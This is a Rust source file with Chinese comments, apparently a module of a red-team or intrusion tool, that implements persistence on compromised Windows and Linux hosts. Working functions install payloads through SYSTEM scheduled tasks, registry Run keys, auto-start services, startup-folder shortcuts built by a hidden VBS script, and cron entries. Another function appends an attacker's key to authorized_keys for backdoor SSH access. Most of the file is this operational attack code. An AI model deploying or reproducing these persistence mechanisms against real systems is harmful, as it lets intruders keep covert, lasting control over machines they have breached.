//! 持久化与权限维持模块
//!
//! 支持Windows和Linux平台的多种持久化技术。

use serde::{Deserialize, Serialize};

/// 持久化方法
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum PersistMethod {
    ScheduledTask,
    RegistryRun,
    WindowsService,
    WmiEventSubscription,
    StartupFolder,
    ComHijack,
    DllHijack,
    CronJob,
    SystemdService,
    BashRc,
    SshKey,
}

/// 持久化配置
pub struct PersistConfig {
    pub method: PersistMethod,
    pub payload_path: String,
    pub payload_args: Vec<String>,
    pub name: String,
    pub description: Option<String>,
}

/// 持久化结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistResult {
    pub success: bool,
    pub method: String,
    pub name: String,
    pub cleanup_instructions: String,
}

/// 持久化管理器
pub struct PersistenceManager;

impl PersistenceManager {
    /// 执行持久化部署
    pub fn deploy(config: &PersistConfig) -> Result<PersistResult, String> {
        match config.method {
            PersistMethod::ScheduledTask => deploy_scheduled_task(config),
            PersistMethod::RegistryRun => deploy_registry_run(config),
            PersistMethod::WindowsService => deploy_windows_service(config),
            PersistMethod::StartupFolder => deploy_startup_folder(config),
            PersistMethod::CronJob => deploy_cron_job(config),
            PersistMethod::SshKey => deploy_ssh_key(config),
            _ => Err(format!("{:?} 待实现", config.method)),
        }
    }
}

fn deploy_scheduled_task(config: &PersistConfig) -> Result<PersistResult, String> {
    let full_cmd = format!("{} {}", config.payload_path, config.payload_args.join(" "));
    let output = std::process::Command::new("schtasks")
        .args([
            "/create", "/tn", &config.name,
            "/tr", &full_cmd,
            "/sc", "daily",
            "/st", "09:00",
            "/ru", "SYSTEM",
            "/f",
        ])
        .output()
        .map_err(|e| format!("schtasks创建失败: {}", e))?;

    Ok(PersistResult {
        success: output.status.success(),
        method: "计划任务".to_string(),
        name: config.name.clone(),
        cleanup_instructions: format!("schtasks /delete /tn {} /f", config.name),
    })
}

fn deploy_registry_run(config: &PersistConfig) -> Result<PersistResult, String> {
    let full_cmd = format!("{} {}", config.payload_path, config.payload_args.join(" "));
    let reg_key = r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

    let output = std::process::Command::new("reg")
        .args(["add", reg_key, "/v", &config.name, "/t", "REG_SZ", "/d", &full_cmd, "/f"])
        .output()
        .map_err(|e| format!("注册表添加失败: {}", e))?;

    Ok(PersistResult {
        success: output.status.success(),
        method: "注册表Run键".to_string(),
        name: config.name.clone(),
        cleanup_instructions: format!("reg delete {}\\{} /f", reg_key, config.name),
    })
}

fn deploy_windows_service(config: &PersistConfig) -> Result<PersistResult, String> {
    let bin_path = format!("{} {}", config.payload_path, config.payload_args.join(" "));
    let output = std::process::Command::new("sc")
        .args([
            "create", &config.name,
            "binPath=", &bin_path,
            "start=", "auto",
            "DisplayName=", config.description.as_deref().unwrap_or(&config.name),
        ])
        .output()
        .map_err(|e| format!("sc create失败: {}", e))?;

    // 启动服务
    let _ = std::process::Command::new("sc").args(["start", &config.name]).output();

    Ok(PersistResult {
        success: output.status.success(),
        method: "Windows服务".to_string(),
        name: config.name.clone(),
        cleanup_instructions: format!("sc stop {} && sc delete {}", config.name, config.name),
    })
}

fn deploy_startup_folder(config: &PersistConfig) -> Result<PersistResult, String> {
    let startup = std::env::var("APPDATA")
        .map(|p| format!(r"{}\Microsoft\Windows\Start Menu\Programs\Startup", p))
        .unwrap_or_else(|_| r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup".to_string());

    let lnk_path = format!(r"{}\{}.lnk", startup, config.name);

    // 创建VBS快捷方式
    let vbs = format!(
        r#"Set WshShell = WScript.CreateObject("WScript.Shell")
Set Shortcut = WshShell.CreateShortcut("{}")
Shortcut.TargetPath = "{}"
Shortcut.Arguments = "{}"
Shortcut.WindowStyle = 7
Shortcut.Save
"#,
        lnk_path, config.payload_path, config.payload_args.join(" ")
    );

    let temp_vbs = std::env::temp_dir().join("create_lnk.vbs");
    std::fs::write(&temp_vbs, &vbs).map_err(|e| format!("创建VBS失败: {}", e))?;

    let output = std::process::Command::new("cscript")
        .args(["/nologo", &temp_vbs.to_string_lossy()])
        .output()
        .map_err(|e| format!("cscript失败: {}", e))?;

    let _ = std::fs::remove_file(&temp_vbs);

    Ok(PersistResult {
        success: output.status.success(),
        method: "启动文件夹".to_string(),
        name: config.name.clone(),
        cleanup_instructions: format!("del \"{}\"", lnk_path),
    })
}

fn deploy_cron_job(config: &PersistConfig) -> Result<PersistResult, String> {
    let full_cmd = format!("{} {}", config.payload_path, config.payload_args.join(" "));
    let cron_line = format!("0 */4 * * * {}", full_cmd);

    let output = std::process::Command::new("sh")
        .args(["-c", &format!("(crontab -l 2>/dev/null; echo '{}') | crontab -", cron_line)])
        .output()
        .map_err(|e| format!("crontab失败: {}", e))?;

    Ok(PersistResult {
        success: output.status.success(),
        method: "Cron作业".to_string(),
        name: config.name.clone(),
        cleanup_instructions: "crontab -e 删除对应行".to_string(),
    })
}

fn deploy_ssh_key(config: &PersistConfig) -> Result<PersistResult, String> {
    let ssh_dir = std::env::var("HOME")
        .map(|h| format!("{}/.ssh", h))
        .unwrap_or_else(|_| "/root/.ssh".to_string());

    let auth_keys = format!("{}/authorized_keys", ssh_dir);
    std::fs::create_dir_all(&ssh_dir).map_err(|e| format!("创建SSH目录失败: {}", e))?;

    // 追加公钥
    let existing = std::fs::read_to_string(&auth_keys).unwrap_or_default();
    if !existing.contains(&config.payload_path) {
        let new_content = format!("{}\n{}", existing, config.payload_path);
        std::fs::write(&auth_keys, &new_content).map_err(|e| format!("写入SSH密钥失败: {}", e))?;
    }

    Ok(PersistResult {
        success: true,
        method: "SSH密钥".to_string(),
        name: config.name.clone(),
        cleanup_instructions: format!("从 {} 中删除对应密钥行", auth_keys),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_persist_config() {
        let config = PersistConfig {
            method: PersistMethod::ScheduledTask,
            payload_path: "C:\\Windows\\System32\\cmd.exe".to_string(),
            payload_args: vec!["/c".to_string(), "echo test".to_string()],
            name: "TestTask".to_string(),
            description: Some("测试任务".to_string()),
        };
        assert_eq!(config.method, PersistMethod::ScheduledTask);
        assert_eq!(config.name, "TestTask");
    }

    #[test]
    fn test_registry_deploy() {
        let config = PersistConfig {
            method: PersistMethod::RegistryRun,
            payload_path: "notepad.exe".to_string(),
            payload_args: vec![],
            name: "TestReg".to_string(),
            description: None,
        };
        if cfg!(windows) {
            let result = deploy_registry_run(&config);
            assert!(result.is_ok());
            // 清理
            let _ = std::process::Command::new("reg")
                .args(["delete", r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "/v", "TestReg", "/f"])
                .output();
        }
    }
}
